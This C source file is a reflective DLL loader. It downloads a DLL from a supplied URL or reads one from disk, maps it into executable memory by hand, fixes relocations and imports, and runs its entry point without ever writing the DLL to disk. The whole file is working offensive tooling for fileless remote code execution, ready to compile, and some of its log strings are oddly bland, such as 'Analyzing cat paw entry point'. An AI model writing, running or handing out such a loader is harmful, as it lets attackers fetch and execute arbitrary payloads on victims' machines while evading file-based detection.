#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <winnt.h> // Necessary for PE structure definitions

// #pragma comment(lib, "wininet.lib")

// Define the signature of the Reflective Loader function in the target DLL
// (We will use the standard DllMain entry point for this implementation)
//
/* This program loads and executes a DLL in memory from a file or URL
 *
 * Compile EXE:
 *
 * $ x86_64-w64-mingw32-gcc remote_dll_loader.c -o remote_dll_loader.exe -lwininet
*/
typedef DWORD(WINAPI* REFLECTIVELOADER)(VOID);


/**
 * @brief Performs reflective loading and execution of a DLL from an in-memory buffer.
 * @param pDllBuffer Pointer to the downloaded raw DLL data.
 * @param dwLength Length of the DLL data buffer.
 * @return int 0 on success, non-zero on failure.
 */
int ReflectivelyLoadAndExecute(LPVOID pDllBuffer, DWORD dwLength) {
    if (pDllBuffer == NULL || dwLength < sizeof(IMAGE_DOS_HEADER)) {
        printf("Error: Invalid DLL buffer received.\n");
        return -1;
    }

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pDllBuffer;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_SECTION_HEADER pSectionHdr;

    // 1. Validate DOS and NT Headers
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Error: Invalid DOS signature.\n");
        return -1;
    }

    pNtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)pDllBuffer + pDosHdr->e_lfanew);
    if (pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf("Error: Invalid NT signature.\n");
        return -1;
    }

    // Ensure it's a 64-bit executable (IMAGE_NT_HEADERS64)
    if (pNtHdr->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("Error: Not a 64-bit DLL (Target: %x, Expected: %x)\n", 
               pNtHdr->FileHeader.Machine, IMAGE_FILE_MACHINE_AMD64);
        return -1;
    }
    
    ULONGLONG dwImageBase = pNtHdr->OptionalHeader.ImageBase;
    SIZE_T dwImageSize = pNtHdr->OptionalHeader.SizeOfImage;

    // 2. Allocate memory for the target image
    LPVOID pTargetBase = VirtualAlloc(NULL, dwImageSize, 
                                 MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    if (pTargetBase == NULL) {
        printf("Error: Failed to allocate memory for DLL (VirtualAlloc).\n");
        return -1;
    }
    printf("Allocated target memory base: 0x%p\n", pTargetBase);

    // 3. Map Headers and Sections
    
    // Copy the Headers
    memcpy(pTargetBase, pDllBuffer, pNtHdr->OptionalHeader.SizeOfHeaders);

    // The section headers are located immediately after the IMAGE_NT_HEADERS
    pSectionHdr = (PIMAGE_SECTION_HEADER)((LPBYTE)pNtHdr + sizeof(IMAGE_NT_HEADERS));
    
    for (int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        LPVOID pTargetSection = (LPBYTE)pTargetBase + pSectionHdr[i].VirtualAddress;
        LPVOID pSourceSection = (LPBYTE)pDllBuffer + pSectionHdr[i].PointerToRawData;
        
        // Copy data sections
        if (pSectionHdr[i].SizeOfRawData > 0) {
             memcpy(pTargetSection, pSourceSection, pSectionHdr[i].SizeOfRawData);
        }
    }
    printf("Successfully mapped headers and sections.\n");

    // 4. Handle Base Relocations (CRUCIAL FIX)
    ULONGLONG dwDelta = (ULONGLONG)pTargetBase - dwImageBase;
    
    if (dwDelta != 0) {
        printf("Applying base relocations. Delta: 0x%llX\n", dwDelta);
        
        PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        
        if (pRelocDir->Size > 0) {
            // Relocation table starts after the headers (mapped to target base)
            PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)((LPBYTE)pTargetBase + pRelocDir->VirtualAddress);

            while (pRelocBlock->SizeOfBlock > 0) {
                // Calculate number of entries in the current block
                int dwEntryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pRelocEntry = (PWORD)((LPBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

                for (int i = 0; i < dwEntryCount; i++) {
                    WORD wType = (*pRelocEntry >> 12);
                    WORD wOffset = (*pRelocEntry & 0x0FFF);

                    LPBYTE pFixupAddr = (LPBYTE)pTargetBase + pRelocBlock->VirtualAddress + wOffset;

                    switch (wType) {
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break; // Do nothing
                        case IMAGE_REL_BASED_DIR64:
                            // 64-bit addresses need the full delta applied
                            *(ULONGLONG*)pFixupAddr += dwDelta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            // 32-bit addresses need the 32-bit delta applied
                            *(DWORD*)pFixupAddr += (DWORD)dwDelta;
                            break;
                        default:
                            printf("Warning: Unsupported relocation type %u at 0x%p\n", wType, pFixupAddr);
                            break;
                    }
                    pRelocEntry++;
                }
                
                // Move to the next block
                pRelocBlock = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRelocBlock + pRelocBlock->SizeOfBlock);
            }
        }
        printf("Base relocations applied successfully.\n");
    } else {
        printf("Base relocations not required.\n");
    }


    // 5. Handle Import Address Table (IAT) Fixups
    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (pImportDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pTargetBase + pImportDir->VirtualAddress);

        while (pImportDesc->Name != 0) {
            LPCSTR szDllName = (LPCSTR)((LPBYTE)pTargetBase + pImportDesc->Name);
            HMODULE hMod = LoadLibraryA(szDllName);

            if (hMod == NULL) {
                printf("Error: Failed to load dependent DLL: %s\n", szDllName);
                VirtualFree(pTargetBase, 0, MEM_RELEASE);
                return -1;
            }
            
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pTargetBase + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pTargetBase + (pImportDesc->OriginalFirstThunk == 0 ? pImportDesc->FirstThunk : pImportDesc->OriginalFirstThunk));

            while (pOriginalThunk->u1.AddressOfData != 0) {
                FARPROC pFunc;

                if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
                    pFunc = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)pTargetBase + pOriginalThunk->u1.AddressOfData);
                    pFunc = GetProcAddress(hMod, (LPCSTR)pName->Name);
                }

                if (pFunc == NULL) {
                    printf("Error: Failed to resolve function address.\n");
                    VirtualFree(pTargetBase, 0, MEM_RELEASE);
                    return -1;
                }
                
                // Write the resolved address into the IAT
                pThunk->u1.Function = (ULONGLONG)pFunc;
                
                pOriginalThunk++;
                pThunk++;
            }
            pImportDesc++;
        }
    }
    printf("Successfully resolved Import Address Table (IAT).\n");

    // 6. Execute the DLL Entry Point
    ULONGLONG pLoaderFuncAddress = (ULONGLONG)pTargetBase + pNtHdr->OptionalHeader.AddressOfEntryPoint;
    REFLECTIVELOADER pLoaderFunc = (REFLECTIVELOADER)pLoaderFuncAddress;
    
    printf("Analyzing cat paw entry point at 0x%llX...\n", pLoaderFuncAddress);

    // Call DllMain with DLL_PROCESS_ATTACH
    DWORD dwResult = ((BOOL (WINAPI *)(HMODULE, DWORD, LPVOID))pLoaderFunc)(
        (HMODULE)pTargetBase, // hinstDLL
        DLL_PROCESS_ATTACH,   // fdwReason
        NULL                  // lpReserved
    );

    printf("This finished. That returned: %lu\n", dwResult);
    
    // 7. Cleanup
    VirtualFree(pTargetBase, 0, MEM_RELEASE);
    
    return (int)dwResult;
}

// --- NEW: Helper to load a DLL from a local file ---
unsigned char* LoadLocalFile(LPCSTR szPath, DWORD* pdwLength) {
    // 1. Pre-flight check: Does the file actually exist?
    DWORD dwAttrib = GetFileAttributesA(szPath);

    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Error: File '%s' does not exist.\n", szPath);
        return NULL;
    }

    if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        printf("[-] Error: '%s' is a directory, not a DLL file.\n", szPath);
        return NULL;
    }

    // 2. Proceed to open the file
    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open local file. Error: %lu\n", GetLastError());
        return NULL;
    }

    *pdwLength = GetFileSize(hFile, NULL);
    if (*pdwLength == 0 || *pdwLength == INVALID_FILE_SIZE) {
        printf("[-] Error: File is empty or invalid size.\n");
        CloseHandle(hFile);
        return NULL;
    }

    // 3. Allocate and Read
    unsigned char* buffer = (unsigned char*)malloc(*pdwLength);
    if (buffer) {
        DWORD bytesRead;
        if (!ReadFile(hFile, buffer, *pdwLength, &bytesRead, NULL)) {
            printf("[-] Failed to read file data. Error: %lu\n", GetLastError());
            free(buffer);
            buffer = NULL;
        }
    }

    CloseHandle(hFile);
    return buffer;
}

// --- NEW: Helper to load a DLL from a URL (Your original logic) ---
unsigned char* LoadRemoteUrl(LPCSTR szUrl, DWORD* pdwLength) {
    HINTERNET hInternet, hConnect;
    DWORD dwBytesRead, dwTotalBytesRead = 0;
    unsigned char* pDllBuffer = NULL;

    hInternet = InternetOpenA("ReflectiveLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    hConnect = InternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    unsigned char chunk[4096];
    while (InternetReadFile(hConnect, chunk, sizeof(chunk), &dwBytesRead) && dwBytesRead > 0) {
        pDllBuffer = (unsigned char*)realloc(pDllBuffer, dwTotalBytesRead + dwBytesRead);
        memcpy(pDllBuffer + dwTotalBytesRead, chunk, dwBytesRead);
        dwTotalBytesRead += dwBytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    *pdwLength = dwTotalBytesRead;
    return pDllBuffer;
}

// --- UPDATED MAIN ---
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <URL or Local Path>\n", argv[0]);
        return 1;
    }

    LPCSTR szTarget = argv[1];
    unsigned char* pDllBuffer = NULL;
    DWORD dwTotalBytesRead = 0;

    // Determine if we are loading from web or disk
    if (strncmp(szTarget, "http", 4) == 0) {
        printf("[+] Target identified as URL. Downloading...\n");
        pDllBuffer = LoadRemoteUrl(szTarget, &dwTotalBytesRead);
    } else {
        printf("[+] Target identified as local file. Reading...\n");
        pDllBuffer = LoadLocalFile(szTarget, &dwTotalBytesRead);
    }

    if (pDllBuffer == NULL || dwTotalBytesRead == 0) {
        printf("[-] Failed to acquire DLL data from target.\n");
        return 1;
    }

    printf("[+] Data acquired (%lu bytes). Starting reflective load...\n", dwTotalBytesRead);

    int result = ReflectivelyLoadAndExecute(pDllBuffer, dwTotalBytesRead);

    if (pDllBuffer) free(pDllBuffer);
    
    return result;
}
